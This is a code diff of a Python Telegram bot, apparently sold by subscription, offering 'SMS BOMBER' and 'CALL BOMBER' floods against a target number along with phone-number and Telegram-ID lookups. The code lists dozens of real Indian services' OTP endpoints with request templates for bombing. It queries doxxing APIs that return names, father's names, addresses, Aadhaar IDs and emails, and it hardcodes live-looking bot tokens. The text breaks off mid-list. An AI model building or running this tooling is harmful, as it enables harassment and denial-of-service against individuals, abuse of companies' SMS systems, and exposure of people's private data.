@@ -1,301 +1,354 @@
-# Telegram Bot Token
-BOT_TOKEN = "8719601099:AAGd-x6FFIi2Zdgq-RsW05YdJpqag4iUUMk"
-
-# Channel Link (Jisko join karna hoga)
-CHANNEL_LINK = "NO"
-
-# Channel Username (without @) - Bot ko channel mein admin banao
-CHANNEL_USERNAME = "NO"
-
-# OWNER IDs - AB MULTIPLE OWNERS
-OWNER_IDS = ["NO", "8721643962"]  # <-- yahan 2nd owner add karo
-
-# ======================================================
-
 import requests
 import time
 import json
 import random
 import threading
-from datetime import datetime
+from datetime import datetime, timedelta
 
-# 📁 FILES
-VERIFIED_USERS_FILE = "verified_users.json"
+# ========= CONFIGURATION =========
+BOT_TOKEN = "8719601099:AAFf0ydBdLTaEkWfJB90v0dsMrOBINhVnTs"
+CHANNEL_LINK = "https://t.me/M_JITENDRA5"
+CHANNEL_USERNAME = "@BGMICHEATDIE"
+OWNER_ID = 8721643962
+OWNER_USERNAME = "@itswillDie"
+DEVELOPER = "@itswillDie"
 
-# 📊 DATA
-verified_users = set()
-bombing_active = {}
-bombing_stats = {}
-cache = {}
+PROTECTED_NUMBER = "khali rakhna"
+PROTECTED_TG_ID = "khali rakhna"
+PROTECTED_TG_USERNAME = "khali rakhna"
 
+WARNING_MSG = "🚫 ACCESS DENIED - Protected number!"
 
-# 🔧 LOAD/SAVE
+# ========= DATA FILES =========
+USERS_FILE = "users_data.json"
+PENDING_FILE = "pending_verification.json"
+USERS_EXPIRY_FILE = "users_expiry.json"
+
+# ========= DATA STRUCTURES =========
+USERS = set()
+PENDING_USERS = {}
+USERS_EXPIRY = {}
+CACHE = {}
+BOMBING_ACTIVE = {}
+BOMBING_STATS = {}
+
+# ========= LOAD/SAVE =========
 def load_data():
-    global verified_users
+    global USERS, PENDING_USERS, USERS_EXPIRY
     try:
-        with open(VERIFIED_USERS_FILE, "r") as f:
+        with open(USERS_FILE, "r") as f:
             data = json.load(f)
-            verified_users = set(data.get("verified", []))
+            USERS = set(data.get("users", []))
     except:
-        verified_users = set()
+        USERS = set()
+    
+    try:
+        with open(PENDING_FILE, "r") as f:
+            PENDING_USERS = json.load(f)
+    except:
+        PENDING_USERS = {}
+    
+    try:
+        with open(USERS_EXPIRY_FILE, "r") as f:
+            USERS_EXPIRY = json.load(f)
+    except:
+        USERS_EXPIRY = {}
 
 def save_data():
-    with open(VERIFIED_USERS_FILE, "w") as f:
-        json.dump({"verified": list(verified_users)}, f)
+    with open(USERS_FILE, "w") as f:
+        json.dump({"users": list(USERS)}, f)
+    with open(PENDING_FILE, "w") as f:
+        json.dump(PENDING_USERS, f)
+    with open(USERS_EXPIRY_FILE, "w") as f:
+        json.dump(USERS_EXPIRY, f)
 
-# 🔐 CHECK USER IN CHANNEL
-def check_user_in_channel(user_id):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
-
-        # ⚠️ IMPORTANT: PRIVATE CHANNEL NEEDS CHAT ID, NOT @USERNAME
-        params = {
-            "chat_id": CHANNEL_USERNAME,  # must be channel ID like -100xxxxxxxxxx
-            "user_id": user_id
-        }
-
-        response = requests.get(url, params=params, timeout=10)
-        data = response.json()
-
-        if data.get("ok"):
-            status = data["result"]["status"]
-            return status in ["creator", "administrator", "member"]
-
-        return False
-
-    except Exception as e:
-        print("Check error:", e)
-        return False
-
-# 📨 TELEGRAM FUNCTIONS
-def send_message(chat_id, text, reply_markup=None, parse_mode="HTML"):
+# ========= TELEGRAM API =========
+def send_telegram_message(chat_id, text, reply_markup=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    data = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
-
+    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
     if reply_markup:
         data["reply_markup"] = json.dumps(reply_markup)
-
     try:
-        requests.post(url, data=data, timeout=10)
+        requests.post(url, data=data, timeout=5)
     except:
         pass
 
-def edit_message(chat_id, message_id, text, reply_markup=None):
+def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
-    data = {
-        "chat_id": chat_id,
-        "message_id": message_id,
-        "text": text,
-        "parse_mode": "HTML"
-    }
-
+    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
     if reply_markup:
         data["reply_markup"] = json.dumps(reply_markup)
-
     try:
-        requests.post(url, data=data, timeout=10)
+        requests.post(url, data=data, timeout=5)
     except:
         pass
 
 def get_updates(offset=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-    params = {"timeout": 30}
-
+    params = {"timeout": 25, "allowed_updates": ["message", "callback_query"]}
     if offset:
         params["offset"] = offset
-
     try:
-        response = requests.get(url, params=params, timeout=35)
+        response = requests.get(url, params=params, timeout=30)
         return response.json().get("result", [])
     except:
         return []
 
-# 🔥 CHECK OWNER
-def is_owner(user_id):
-    return str(user_id) in OWNER_IDS
-
-# ======================================================
-# 🤖 MESSAGE HANDLER (ADD BROADCAST HERE)
-# ======================================================
-def handle_message(chat_id, text, username, first_name, user_states):
-
-    # 📢 BROADCAST COMMAND
-    if text.startswith("/broadcast "):
-
-        if not is_owner(chat_id):
-            send_message(chat_id, "❌ You are not authorized!", main_keyboard())
-            return None
-
-        msg = text.replace("/broadcast ", "").strip()
-
-        if not msg:
-            send_message(chat_id, "⚠️ Usage:\n/broadcast Your Message", main_keyboard())
-            return None
-
-        send_message(chat_id, "📡 Broadcasting started...")
-
-        success, fail = broadcast_to_all(msg, chat_id)
-
-        send_message(
-            chat_id,
-            f"✅ Broadcast Done!\n\n📨 Success: {success}\n❌ Failed: {fail}",
-            main_keyboard()
-        )
-
+def get_user_info(user_id):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChat"
+    params = {"chat_id": user_id}
+    try:
+        response = requests.get(url, params=params, timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get("ok"):
+                result = data.get("result", {})
+                return {
+                    "first_name": result.get("first_name", "Unknown"),
+                    "username": result.get("username", ""),
+                    "user_id": user_id
+                }
+        return None
+    except:
         return None
 
-    # (rest of your existing commands below...)
-    return None
+# ========= EXPIRY CHECK =========
+def is_user_expired(user_id):
+    if user_id == OWNER_ID:
+        return False
+    if str(user_id) in USERS_EXPIRY:
+        expiry = USERS_EXPIRY[str(user_id)].get("expiry", 0)
+        if expiry > time.time():
+            return False
+        else:
+            if user_id in USERS:
+                USERS.remove(user_id)
+            save_data()
+            return True
+    return True
 
-# ======================================================
-# 🎨 GREEN GRADIENT BUTTONS (SIRF COLOUR CHANGE)
-# ======================================================
+def is_verified(chat_id):
+    if chat_id == OWNER_ID:
+        return True
+    if chat_id in USERS and not is_user_expired(chat_id):
+        return True
+    return False
 
+def get_days_left(user_id):
+    if str(user_id) in USERS_EXPIRY:
+        expiry = USERS_EXPIRY[str(user_id)].get("expiry", 0)
+        if expiry > time.time():
+            return int((expiry - time.time()) / (24*60*60))
+    return 0
+
+# ========= KEYBOARDS =========
 def main_keyboard():
     return {
         "keyboard": [
             ["📞 NUMBER LOOKUP", "🆔 TG ID TO NUMBER"],
-            ["💣 SMS PRANK", "📞 CALL PRANK"],
-            ["📊 STATS", "🛑 STOP BOMB"]
+            ["💣 SMS BOMBER", "📞 CALL BOMBER"],
+            ["📊 STATS", "🛑 STOP BOMB"],
+            ["✅ VERIFY ME", "📢 CHANNEL"]
         ],
         "resize_keyboard": True,
         "one_time_keyboard": False
     }
 
-def verify_keyboard():
+def owner_keyboard():
+    return {
+        "keyboard": [
+            ["📞 NUMBER LOOKUP", "🆔 TG ID TO NUMBER"],
+            ["💣 SMS BOMBER", "📞 CALL BOMBER"],
+            ["📊 STATS", "🛑 STOP BOMB"],
+            ["✅ VERIFY ME", "📢 CHANNEL"],
+            ["👑 PENDING", "👑 ADD USER"],
+            ["👑 REMOVE USER", "👑 TOTAL USERS"],
+            ["📢 BROADCAST"]
+        ],
+        "resize_keyboard": True,
+        "one_time_keyboard": False
+    }
+
+def verification_keyboard():
     return {
         "inline_keyboard": [
-            [{"text": "📢 JOIN CHANNEL", "url": CHANNEL_LINK}],
-            [{"text": "✅ VERIFY MEMBERSHIP", "callback_data": "verify"}]
+            [{"text": "✅ SEND REQUEST", "callback_data": "check_verify"}]
         ]
     }
 
-# Simple welcome message (no fancy boxes)
-def get_welcome_message(first_name):
-    return f"""
-🔥 WELCOME {first_name} 🔥
+def owner_verify_keyboard(user_id):
+    return {
+        "inline_keyboard": [
+            [{"text": "✅ ACCEPT", "callback_data": f"accept_{user_id}"}],
+            [{"text": "❌ DECLINE", "callback_data": f"decline_{user_id}"}]
+        ]
+    }
 
-⚠️ VERIFICATION REQUIRED
+def days_keyboard(user_id):
+    return {
+        "inline_keyboard": [
+            [{"text": "📅 7 DAYS", "callback_data": f"days_7_{user_id}"}, {"text": "📅 15 DAYS", "callback_data": f"days_15_{user_id}"}],
+            [{"text": "📅 30 DAYS", "callback_data": f"days_30_{user_id}"}, {"text": "📅 60 DAYS", "callback_data": f"days_60_{user_id}"}],
+            [{"text": "📅 90 DAYS", "callback_data": f"days_90_{user_id}"}, {"text": "📅 180 DAYS", "callback_data": f"days_180_{user_id}"}],
+            [{"text": "📅 365 DAYS", "callback_data": f"days_365_{user_id}"}]
+        ]
+    }
 
-JOIN CHANNEL TO ACCES INFO BOT
-
-📢 Channel: {CHANNEL_LINK}
-
-👉 CLICK TO JOIN CHANNEL 
-👉 THEN VERIFY MEMBERSHIP
-
-👑 OWNER: @itswillDie
-"""
-
-def get_main_menu_message(first_name):
-    return f"""
-🔥 WELCOME {first_name} 🔥
-
-📡 ACTIVE APIS
-├ 💬 SMS: {len(SMS_APIS)}
-└ 📞 CALL: {len(CALL_APIS)}
-
-⚡ MODE: UNLIMITED
-🎯 STATUS: READY
-
-DEVELOPER ➠ DIE 
-OWNER ➠ @itswillDie
-"""
-
-def get_stats_message(verified_count, active_count, total_success):
-    return f"""
-📊 BOT STATISTICS
-
-👥 VERIFIED USERS: {verified_count}
-🎯 ACTIVE BOMBS: {active_count}
-✅ TOTAL HITS: {total_success}
-
-💣 SMS APIS: {len(SMS_APIS)}
-📞 CALL APIS: {len(CALL_APIS)}
-
-⚡ STATUS: OPERATIONAL
-
-👑 Owner: @itswillDie
-"""
-
-def get_bomb_start_message(bomb_type, phone, api_count):
-    emoji = "💣" if bomb_type == "sms" else "📞"
-    type_name = "SMS PRANK" if bomb_type == "sms" else "CALL PRANK"
-    return f"""
-{emoji} {type_name} ACTIVE {emoji}
-
-🎯 TARGET: +91{phone}
-📡 APIS LOADED: {api_count}
-⚡ MODE: MAXIMUM SPEED
-
-🛑 Press STOP BOMB to halt
-"""
-
-def get_bomb_stop_message(success, failed, total):
-    return f"""
-🛑 BOMBING STOPPED
-
-✅ SUCCESS: {success}
-❌ FAILED: {failed}
-📊 TOTAL: {total}
-
-👑 OWNER: @itswillDie
-"""
-
-def get_number_lookup_result(num, data):
-    result = f"""
-📞 NUMBER LOOKUP RESULT
-
-🎯 TARGET: {num}
-📋 RECORDS: {len(data)}
-"""
-    for i, r in enumerate(data, start=1):
-        address = r.get('ADDRESS', 'N/A')
-        if address != 'N/A':
-            address = address.replace('!!', ', ').replace('!', ', ')
-        
-        result += f"""
-📋 RECORD {i}
-📞 MOBILE: {r.get('MOBILE', 'N/A')}
-👤 NAME: {r.get('NAME', 'N/A')}"""
-        if r.get("fname"):
-            result += f"\n👨 FATHER: {r.get('fname')}"
-        if address != 'N/A':
-            result += f"\n📍 ADDRESS: {address[:50]}"
-        if r.get("circle"):
-            result += f"\n📡 CIRCLE: {r.get('circle')}"
-        result += "\n"
+# ========= VERIFICATION =========
+def send_verification_to_owner(user_id, username, first_name):
+    user_info = get_user_info(user_id)
+    if user_info:
+        first_name = user_info.get('first_name', first_name)
+        username = user_info.get('username', username)
     
-    result += f"\n👑 Owner: @itswillDie"
+    username_display = f"@{username}" if username else "No username"
+    
+    request_text = f"""🔔 NEW REQUEST 🔔
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+👤 {first_name}
+🆔 <code>{user_id}</code>
+📝 {username_display}
+⏰ {datetime.now().strftime('%H:%M:%S')}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+👇 Press ACCEPT"""
+
+    send_telegram_message(OWNER_ID, request_text, owner_verify_keyboard(user_id))
+
+def accept_user_with_expiry(user_id, days):
+    expiry_time = time.time() + (days * 24 * 60 * 60)
+    
+    USERS_EXPIRY[str(user_id)] = {
+        "expiry": expiry_time,
+        "added_by": OWNER_ID,
+        "days": days,
+        "added_on": time.time()
+    }
+    USERS.add(user_id)
+    
+    if str(user_id) in PENDING_USERS:
+        del PENDING_USERS[str(user_id)]
+    
+    save_data()
+    
+    user_info = get_user_info(user_id)
+    first_name = user_info.get('first_name', 'User') if user_info else 'User'
+    expiry_date = datetime.fromtimestamp(expiry_time).strftime('%Y-%m-%d')
+    
+    welcome_text = f"""✅ VERIFIED! ✅
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Welcome {first_name}!
+Access: {days} days
+Expires: {expiry_date}
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Use buttons below!"""
+
+    send_telegram_message(user_id, welcome_text, main_keyboard())
+    send_telegram_message(OWNER_ID, f"✅ User {user_id} verified for {days} days!")
+
+def decline_user(user_id):
+    if str(user_id) in PENDING_USERS:
+        del PENDING_USERS[str(user_id)]
+    save_data()
+    send_telegram_message(user_id, "❌ Request declined!")
+    send_telegram_message(OWNER_ID, f"❌ User {user_id} declined!")
+
+def add_user_direct(owner_id, user_id, days):
+    if owner_id != OWNER_ID:
+        return False
+    
+    expiry_time = time.time() + (days * 24 * 60 * 60)
+    
+    USERS_EXPIRY[str(user_id)] = {
+        "expiry": expiry_time,
+        "added_by": owner_id,
+        "days": days,
+        "added_on": time.time()
+    }
+    USERS.add(user_id)
+    save_data()
+    
+    user_info = get_user_info(user_id)
+    first_name = user_info.get('first_name', 'User') if user_info else 'User'
+    expiry_date = datetime.fromtimestamp(expiry_time).strftime('%Y-%m-%d')
+    
+    send_telegram_message(user_id, f"✅ Added by owner!\nAccess: {days} days\nExpires: {expiry_date}\nUse /start", main_keyboard())
+    send_telegram_message(owner_id, f"✅ User {user_id} added for {days} days!")
+    return True
+
+def remove_user_direct(owner_id, user_id):
+    if owner_id != OWNER_ID:
+        return False
+    
+    if str(user_id) in USERS_EXPIRY:
+        del USERS_EXPIRY[str(user_id)]
+    if user_id in USERS:
+        USERS.remove(user_id)
+    save_data()
+    
+    send_telegram_message(user_id, "❌ Access removed!")
+    send_telegram_message(owner_id, f"✅ User {user_id} removed!")
+    return True
+
+def get_total_users_list(owner_id):
+    if owner_id != OWNER_ID:
+        return "Unauthorized"
+    
+    active = 0
+    expired = 0
+    now = time.time()
+    active_list = []
+    
+    for uid, data in USERS_EXPIRY.items():
+        if data.get("added_by") == owner_id:
+            if data.get("expiry", 0) > now:
+                active += 1
+                days_left = int((data["expiry"] - now) / (24*60*60))
+                active_list.append(f"🆔 {uid} - {days_left} days left")
+            else:
+                expired += 1
+    
+    result = f"📊 YOUR USERS\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n✅ Active: {active}\n❌ Expired: {expired}\n"
+    if active_list:
+        result += "\n" + "\n".join(active_list[:15])
     return result
 
-def get_tgid_result(userid, number, country):
-    return f"""
-🆔 TG ID TO NUMBER RESULT
+def send_verification_panel(chat_id):
+    verify_text = f"""🔐 VERIFICATION REQUIRED
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+Press SEND REQUEST button to request access.
+Owner will approve and set access days."""
 
-👤 USER ID: {userid}
-📞 PHONE: +{number}
-🌍 COUNTRY: {country}
+    send_telegram_message(chat_id, verify_text, verification_keyboard())
 
-👑 Owner: @itswillDie
-"""
+# ========= BROADCAST =========
+def broadcast_to_users(admin_id, message_text):
+    if admin_id != OWNER_ID:
+        send_telegram_message(admin_id, "❌ Only owner can broadcast!")
+        return None
+    
+    if not message_text:
+        send_telegram_message(admin_id, "📢 Send message to broadcast:")
+        return "awaiting_broadcast"
+    
+    success = 0
+    for user_id in USERS:
+        try:
+            send_telegram_message(user_id, message_text)
+            success += 1
+            time.sleep(0.05)
+        except:
+            pass
+    
+    send_telegram_message(admin_id, f"✅ Sent to {success} users!")
+    return None
 
-def get_broadcast_message(msg):
-    return f"""
-📢 OWNER ANNOUNCEMENT
-
-{msg}
-
-👑 OWNER: @itswillDie
-"""
-
-# ======================================================
-# 📞 NUMBER LOOKUP API
-# ======================================================
+# ========= API FUNCTIONS =========
 def number_lookup_api(num):
+    if num == PROTECTED_NUMBER:
+        return "PROTECTED"
     try:
         url = f"https://darkietech.site/numapi.php?action=api&key=AKASH&number={num}"
-        response = requests.get(url, timeout=10)
+        response = requests.get(url, timeout=5)
         if response.status_code == 200:
             data = response.json()
             if isinstance(data, list) and len(data) > 0:
@@ -305,29 +358,41 @@ def number_lookup_api(num):
         return None
 
 def number_lookup_backup(num):
+    if num == PROTECTED_NUMBER:
+        return "PROTECTED"
     try:
         url = f"https://num-to-info-ten.vercel.app/?num={num}"
-        response = requests.get(url, timeout=10)
+        response = requests.get(url, timeout=5)
         if response.status_code == 200:
             data = response.json()
-            if data.get("success") and data.get("data"):
-                return [{
-                    "NAME": data.get("data", {}).get("name", "N/A"),
-                    "fname": data.get("data", {}).get("father_name", "N/A"),
-                    "ADDRESS": data.get("data", {}).get("address", "N/A"),
-                    "circle": data.get("data", {}).get("operator", "N/A"),
-                    "MOBILE": num,
-                    "alt": data.get("data", {}).get("alt_mobile", "N/A"),
-                    "id": data.get("data", {}).get("aadhaar", "N/A")
-                }]
+            if data.get("success") and data.get("result", {}).get("success"):
+                results = data["result"].get("results", [])
+                if results and len(results) > 0:
+                    formatted_results = []
+                    for item in results:
+                        formatted_result = {
+                            "NAME": item.get("NAME", "N/A"),
+                            "fname": item.get("fname", "N/A"),
+                            "ADDRESS": item.get("ADDRESS", "N/A"),
+                            "circle": item.get("circle", "N/A"),
+                            "MOBILE": item.get("MOBILE", num),
+                            "alt": item.get("alt", "N/A"),
+                            "id": item.get("id", "N/A"),
+                            "email": item.get("email", "N/A")
+                        }
+                        formatted_results.append(formatted_result)
+                    if len(formatted_results) > 0:
+                        return formatted_results
         return None
     except:
         return None
 
 def tgid_to_number_api(userid):
+    if str(userid) == PROTECTED_TG_ID or str(userid).lower() == PROTECTED_TG_USERNAME.lower():
+        return "PROTECTED"
     try:
         url = f"https://cyber-osint-tg-num.vercel.app/api/tginfo?key=Rogers2&id={userid}"
-        response = requests.get(url, timeout=10)
+        response = requests.get(url, timeout=5)
         if response.status_code == 200:
             data = response.json()
             if data.get("result") == True and data.get("number"):
@@ -335,294 +400,75 @@ def tgid_to_number_api(userid):
                     "number": data.get("number"),
                     "country": data.get("country", "Unknown"),
                     "country_code": data.get("country_code", "+91"),
-                    "tg_id": userid
+                    "tg_id": userid,
                 }
         return None
     except:
         return None
 
-# ======================================================
-# 💣 SMS APIS
-# ======================================================
+# ========= SMS/CALL APIS =========
 SMS_APIS = [
-    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
-    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
-    {"name": "NoBroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&countryCode=IN"},
-    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
-    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
-    {"name": "Lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
-    {"name": "PharmEasy", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Byju's", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"source=sms&mobile_number={p}&platform=ANDROID"},
-    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
-    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "1MG", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otp_on_call":false}}'},
-    {"name": "Swiggy", "url": "https://profile.swiggy.com/api/v3/app/request_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
+    {"name": "Hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91"}}'},
     {"name": "Flipkart", "url": "https://www.flipkart.com/api/6/user/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
     {"name": "Paytm", "url": "https://accounts.paytm.com/signin/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Zomato", "url": "https://www.zomato.com/php/o2_api_handler.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"phone={p}&type=sms"},
-    {"name": "Ola", "url": "https://api.olacabs.com/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "MakeMyTrip", "url": "https://www.makemytrip.com/api/4/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Goibibo", "url": "https://www.goibibo.com/user/otp/generate/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Tata Capital", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "KPN Fresh", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
-    {"name": "Servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"mobile_number={p}"},
-    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}"},
-    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","city":362}}'},
-    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
-    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
-    {"name": "Univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {}, "data": None},
-    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","email":"test@example.com"}}'},
-    {"name": "MyHubble", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
-    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
-    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
-    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
-    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}"}}'},
-    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
-    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
-    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
-    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
-    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
-    {"name": "BigCash", "url": lambda p: f"https://www.bigcash.live/sendsms.php?mobile={p}&ip=192.168.1.1", "method": "GET", "headers": {}, "data": None},
-    {"name": "WorkIndia", "url": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623", "method": "GET", "headers": {}, "data": None},
-    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
-    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
-    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
-    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
-    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
-    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
-    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
